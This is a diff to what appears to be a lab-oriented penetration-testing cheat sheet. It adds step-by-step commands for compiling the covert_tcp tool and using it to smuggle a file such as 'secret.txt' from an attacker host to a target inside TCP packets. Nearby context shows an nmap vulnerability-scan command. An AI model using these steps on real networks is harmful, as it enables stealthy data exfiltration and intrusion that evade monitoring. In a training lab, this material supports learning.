@@ -2941,7 +2941,7 @@ in powershell
 :~$ nmap -T4 -Ss -p 139,445 - -script vuln <IP/24> 
 
 ```
-</summary>
+</details>
 
 <details>
 
@@ -3612,5 +3612,48 @@ id
 
 ```console
 :~$ use service manager in windows 
+```
+</details>
+
+<details>
+
+<summary>Covert tcp</summary>
+
+```console
+:~$ Step 1: Download Covert_TCP
+
+In Kali:
+
+git clone https://github.com/your-lab/covert_tcp.git
+cd covert_tcp
+
+Or if already present in lab:
+
+locate covert_tcp
+
+Then compile:
+
+gcc covert_tcp.c -o covert_tcp
+ Step 2: Setup Listener (Receiver Side – Target)
+
+On target machine:
+
+./covert_tcp -dest <target-ip> -source <attacker-ip> -server -file output.txt
+
+This waits to receive hidden data.
+
+ Step 3: Send Data (Attacker Side)
+
+On attacker:
+
+./covert_tcp -dest <target-ip> -source <attacker-ip> -client -file secret.txt
+
+This sends file secretly inside TCP packets.
+
+ Step 4: Verify
+
+On target:
+
+cat output.txt
 ```
 </details>
